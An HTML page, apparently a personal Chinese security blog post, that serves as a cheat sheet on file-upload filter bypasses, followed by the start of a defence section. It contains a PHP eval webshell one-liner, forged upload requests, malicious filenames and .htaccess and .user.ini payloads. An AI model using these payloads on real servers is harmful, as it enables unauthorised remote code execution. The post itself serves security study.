@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"lvyatan.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12,"width":280},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null,"show_result":true},"fold":{"enable":false,"height":500},"language":false,"border_radius":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="0x00 前言文件上传是拿 WebShell 最直接的入口，绕过姿势层出不穷。本文梳理常见的过滤方式 + 对应绕过手段，作为速查表使用。  仅用于合法授权环境的安全研究。  0x01 服务端常见过滤点 前端 JS 校验（仅限小白） MIME 类型校验（Content-Type） 后缀名黑名单 后缀名白名单 文件内容校验（magic number） 文件大小 &#x2F; 重命名 &#x2F; 重新">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞绕过技巧整理">
+<meta property="og:url" content="https://lvyatan.github.io/2026/07/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/index.html">
+<meta property="og:site_name" content="网安学习笔记">
+<meta property="og:description" content="0x00 前言文件上传是拿 WebShell 最直接的入口，绕过姿势层出不穷。本文梳理常见的过滤方式 + 对应绕过手段，作为速查表使用。  仅用于合法授权环境的安全研究。  0x01 服务端常见过滤点 前端 JS 校验（仅限小白） MIME 类型校验（Content-Type） 后缀名黑名单 后缀名白名单 文件内容校验（magic number） 文件大小 &#x2F; 重命名 &#x2F; 重新">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-07-05T06:00:00.000Z">
+<meta property="article:modified_time" content="2026-09-01T10:06:13.169Z">
+<meta property="article:author" content="lvyatan">
+<meta property="article:tag" content="Web 安全">
+<meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="绕过技巧">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://lvyatan.github.io/2026/07/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://lvyatan.github.io/2026/07/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/","path":"2026/07/05/文件上传漏洞绕过技巧/","title":"文件上传漏洞绕过技巧整理"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>文件上传漏洞绕过技巧整理 | 网安学习笔记</title>
+  
+
+
+
+
+
+
+
+
+  
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">网安学习笔记</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">网络安全学习与渗透测试实践</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E7%82%B9"><span class="nav-number">2.</span> <span class="nav-text">0x01 服务端常见过滤点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%B8%85%E5%8D%95"><span class="nav-number">3.</span> <span class="nav-text">0x02 绕过技术清单</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%89%8D%E7%AB%AF%E7%BB%95%E8%BF%87"><span class="nav-number">3.1.</span> <span class="nav-text">1. 前端绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Content-Type-%E7%BB%95%E8%BF%87"><span class="nav-number">3.2.</span> <span class="nav-text">2. Content-Type 绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%90%8E%E7%BC%80%E5%90%8D%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="nav-number">3.3.</span> <span class="nav-text">3. 后缀名黑名单绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">3.4.</span> <span class="nav-text">4. 大小写绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87"><span class="nav-number">3.5.</span> <span class="nav-text">5. 双写后缀绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E7%A9%BA%E6%A0%BC-%E7%82%B9-%E7%BB%95%E8%BF%87%EF%BC%88Windows%EF%BC%89"><span class="nav-number">3.6.</span> <span class="nav-text">6. 空格 &#x2F; 点 绕过（Windows）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-DATA-%E7%BB%95%E8%BF%87%EF%BC%88Windows-IIS%EF%BC%89"><span class="nav-number">3.7.</span> <span class="nav-text">7. ::$DATA 绕过（Windows + IIS）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-htaccess-%E7%BB%95%E8%BF%87%EF%BC%88Apache%EF%BC%89"><span class="nav-number">3.8.</span> <span class="nav-text">8. .htaccess 绕过（Apache）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-user-ini-%E7%BB%95%E8%BF%87%EF%BC%88PHP-FPM%EF%BC%89"><span class="nav-number">3.9.</span> <span class="nav-text">9. .user.ini 绕过（PHP-FPM）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="nav-number">3.10.</span> <span class="nav-text">10. 图片马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-magic-number-%E7%BB%95%E8%BF%87"><span class="nav-number">3.11.</span> <span class="nav-text">11. magic number 绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-00-%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87%EF%BC%88%E6%97%A7-PHP-%E7%89%88%E6%9C%AC%EF%BC%89"><span class="nav-number">3.12.</span> <span class="nav-text">12. 00 截断绕过（旧 PHP 版本）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.</span> <span class="nav-text">0x03 解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-IIS-6-0-%E8%A7%A3%E6%9E%90"><span class="nav-number">4.1.</span> <span class="nav-text">1. IIS 6.0 解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-IIS-7-0-7-5%EF%BC%88FastCGI%EF%BC%89"><span class="nav-number">4.2.</span> <span class="nav-text">2. IIS 7.0&#x2F;7.5（FastCGI）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Nginx-%E8%A7%A3%E6%9E%90"><span class="nav-number">4.3.</span> <span class="nav-text">3. Nginx 解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Apache-%E8%A7%A3%E6%9E%90"><span class="nav-number">4.4.</span> <span class="nav-text">4. Apache 解析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E4%BB%A3%E7%A0%81%E5%B1%82%E9%98%B2%E5%BE%A1%E8%A6%81%E7%82%B9"><span class="nav-number">5.</span> <span class="nav-text">0x04 代码层防御要点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%99%BD%E5%90%8D%E5%8D%95%EF%BC%88%E4%B8%8D%E6%98%AF%E9%BB%91%E5%90%8D%E5%8D%95%EF%BC%89"><span class="nav-number">5.1.</span> <span class="nav-text">1. 白名单（不是黑名单）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E9%87%8D%E5%91%BD%E5%90%8D"><span class="nav-number">5.2.</span> <span class="nav-text">2. 重命名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%86%85%E5%AE%B9%E6%A0%A1%E9%AA%8C"><span class="nav-number">5.3.</span> <span class="nav-text">3. 内容校验</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%AD%98%E5%82%A8%E9%9A%94%E7%A6%BB"><span class="nav-number">5.4.</span> <span class="nav-text">4. 存储隔离</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E8%B7%AF%E5%BE%84%E5%A4%84%E7%90%86"><span class="nav-number">5.5.</span> <span class="nav-text">5. 路径处理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E6%80%BB%E7%BB%93"><span class="nav-number">6.</span> <span class="nav-text">0x05 总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lvyatan"
+      src="https://avatars.githubusercontent.com/lvyatan">
+  <p class="site-author-name" itemprop="name">lvyatan</p>
+  <div class="site-description" itemprop="description">个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/lvyatan" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lvyatan" rel="noopener me" target="_blank"><i class="fa fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2427719053@qq.com" title="E-Mail → mailto:2427719053@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lvyatan.github.io/2026/07/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/lvyatan">
+      <meta itemprop="name" content="lvyatan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网安学习笔记">
+      <meta itemprop="description" content="个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="文件上传漏洞绕过技巧整理 | 网安学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件上传漏洞绕过技巧整理
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-07-05 14:00:00" itemprop="dateCreated datePublished" datetime="2026-07-05T14:00:00+08:00">2026-07-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-09-01 18:06:13" itemprop="dateModified" datetime="2026-09-01T18:06:13+08:00">2026-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web-%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">Web 渗透</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>845</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>文件上传是拿 WebShell 最直接的入口，绕过姿势层出不穷。本文梳理常见的过滤方式 + 对应绕过手段，作为速查表使用。</p>
+<blockquote>
+<p>仅用于合法授权环境的安全研究。</p>
+</blockquote>
+<h2 id="0x01-服务端常见过滤点"><a href="#0x01-服务端常见过滤点" class="headerlink" title="0x01 服务端常见过滤点"></a>0x01 服务端常见过滤点</h2><ol>
+<li>前端 JS 校验（仅限小白）</li>
+<li>MIME 类型校验（Content-Type）</li>
+<li>后缀名黑名单</li>
+<li>后缀名白名单</li>
+<li>文件内容校验（magic number）</li>
+<li>文件大小 &#x2F; 重命名 &#x2F; 重新渲染（如 GD 库处理图片）</li>
+</ol>
+<h2 id="0x02-绕过技术清单"><a href="#0x02-绕过技术清单" class="headerlink" title="0x02 绕过技术清单"></a>0x02 绕过技术清单</h2><h3 id="1-前端绕过"><a href="#1-前端绕过" class="headerlink" title="1. 前端绕过"></a>1. 前端绕过</h3><p>JS 校验：直接 BurpSuite 改包，或浏览器禁用 JS。</p>
+<h3 id="2-Content-Type-绕过"><a href="#2-Content-Type-绕过" class="headerlink" title="2. Content-Type 绕过"></a>2. Content-Type 绕过</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="language-php">-----------------------------xxx</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg   ← 改成 image/jpeg</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>服务端只检查 Content-Type 就会放行。</p>
+<h3 id="3-后缀名黑名单绕过"><a href="#3-后缀名黑名单绕过" class="headerlink" title="3. 后缀名黑名单绕过"></a>3. 后缀名黑名单绕过</h3><ul>
+<li><code>.php3</code> &#x2F; <code>.php4</code> &#x2F; <code>.php5</code> &#x2F; <code>.php7</code> &#x2F; <code>.phtml</code>：PHP 别名</li>
+<li><code>.phtm</code> &#x2F; <code>.pht</code>：PHP 解析配置</li>
+<li><code>.phar</code>：PHP 归档文件，部分配置会执行</li>
+<li><code>.asp</code> &#x2F; <code>.aspx</code> &#x2F; <code>.cer</code> &#x2F; <code>.asa</code>：IIS</li>
+<li><code>.jsp</code> &#x2F; <code>.jspx</code>：Java</li>
+</ul>
+<h3 id="4-大小写绕过"><a href="#4-大小写绕过" class="headerlink" title="4. 大小写绕过"></a>4. 大小写绕过</h3><p>黑名单有时未做大小写统一：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell.PhP</span><br><span class="line">shell.pHP</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-双写后缀绕过"><a href="#5-双写后缀绕过" class="headerlink" title="5. 双写后缀绕过"></a>5. 双写后缀绕过</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename = filename.replace(<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># 上传 shell.pphphp → 过滤后变 shell.php</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-空格-点-绕过（Windows）"><a href="#6-空格-点-绕过（Windows）" class="headerlink" title="6. 空格 &#x2F; 点 绕过（Windows）"></a>6. 空格 &#x2F; 点 绕过（Windows）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell.php       → 被拦</span><br><span class="line">shell.php(空格)  → Windows 自动去尾空格，最终仍为 shell.php</span><br><span class="line">shell.php.      → 末尾点 Windows 自动去除</span><br><span class="line">shell.php:.jpg  → NTFS 流，实际写 shell.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-DATA-绕过（Windows-IIS）"><a href="#7-DATA-绕过（Windows-IIS）" class="headerlink" title="7. ::$DATA 绕过（Windows + IIS）"></a>7. ::$DATA 绕过（Windows + IIS）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.php::$DATA</span><br></pre></td></tr></table></figure>
+
+<p>Windows NTFS 不允许同目录同文件 ::$DATA，实际写入 shell.php。</p>
+<h3 id="8-htaccess-绕过（Apache）"><a href="#8-htaccess-绕过（Apache）" class="headerlink" title="8. .htaccess 绕过（Apache）"></a>8. .htaccess 绕过（Apache）</h3><p>先传 <code>.htaccess</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<p>然后传 <code>shell.jpg</code>，内容是 PHP 代码，会被当 PHP 执行。</p>
+<h3 id="9-user-ini-绕过（PHP-FPM）"><a href="#9-user-ini-绕过（PHP-FPM）" class="headerlink" title="9. .user.ini 绕过（PHP-FPM）"></a>9. .user.ini 绕过（PHP-FPM）</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; .user.ini</span></span><br><span class="line"><span class="attr">auto_prepend_file</span>=shell.jpg</span><br></pre></td></tr></table></figure>
+
+<p>访问同目录下任意 <code>.php</code> 文件都会 prepend shell.jpg 内容。</p>
+<h3 id="10-图片马"><a href="#10-图片马" class="headerlink" title="10. 图片马"></a>10. 图片马</h3><p>PHP 代码合并到真实图片后部：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy normal.jpg/b + shell.php/a shell.jpg</span><br></pre></td></tr></table></figure>
+
+<p>配合 <code>.htaccess</code> 或文件包含漏洞触发执行。</p>
+<h3 id="11-magic-number-绕过"><a href="#11-magic-number-绕过" class="headerlink" title="11. magic number 绕过"></a>11. magic number 绕过</h3><p>服务端检查文件头：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 PHP 文件前加图片头</span></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="12-00-截断绕过（旧-PHP-版本）"><a href="#12-00-截断绕过（旧-PHP-版本）" class="headerlink" title="12. 00 截断绕过（旧 PHP 版本）"></a>12. 00 截断绕过（旧 PHP 版本）</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;shell.php%00.jpg&quot;</span><br></pre></td></tr></table></figure>
+
+<p>服务端检查 .jpg 通过，但 <code>move_uploaded_file</code> 时截断到 <code>shell.php</code>。</p>
+<h2 id="0x03-解析漏洞"><a href="#0x03-解析漏洞" class="headerlink" title="0x03 解析漏洞"></a>0x03 解析漏洞</h2><p>服务端就算过滤严格，配合服务器解析漏洞仍可拿 shell。</p>
+<h3 id="1-IIS-6-0-解析"><a href="#1-IIS-6-0-解析" class="headerlink" title="1. IIS 6.0 解析"></a>1. IIS 6.0 解析</h3><ul>
+<li><code>shell.asp;.jpg</code> → 当 asp 执行</li>
+<li>目录解析：<code>xxx.asp/1.jpg</code> → 目录下所有文件当 asp 执行</li>
+</ul>
+<h3 id="2-IIS-7-0-7-5（FastCGI）"><a href="#2-IIS-7-0-7-5（FastCGI）" class="headerlink" title="2. IIS 7.0&#x2F;7.5（FastCGI）"></a>2. IIS 7.0&#x2F;7.5（FastCGI）</h3><p><code>shell.jpg/.php</code> → jpg 当 PHP 执行。</p>
+<h3 id="3-Nginx-解析"><a href="#3-Nginx-解析" class="headerlink" title="3. Nginx 解析"></a>3. Nginx 解析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.jpg/x.php</span><br></pre></td></tr></table></figure>
+
+<p>PHP <code>cgi.fix_pathinfo=1</code> 时，会以 <code>.php</code> 解析前面的文件。</p>
+<h3 id="4-Apache-解析"><a href="#4-Apache-解析" class="headerlink" title="4. Apache 解析"></a>4. Apache 解析</h3><p>Apache 后缀从右往左解析，遇到不认识的就跳过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.php.aab   → 当 PHP 解析</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-代码层防御要点"><a href="#0x04-代码层防御要点" class="headerlink" title="0x04 代码层防御要点"></a>0x04 代码层防御要点</h2><h3 id="1-白名单（不是黑名单）"><a href="#1-白名单（不是黑名单）" class="headerlink" title="1. 白名单（不是黑名单）"></a>1. 白名单（不是黑名单）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allowed</span> = [<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>];</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION));</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allowed</span>)) <span class="keyword">die</span>(<span class="string">&#x27;不允许的后缀&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
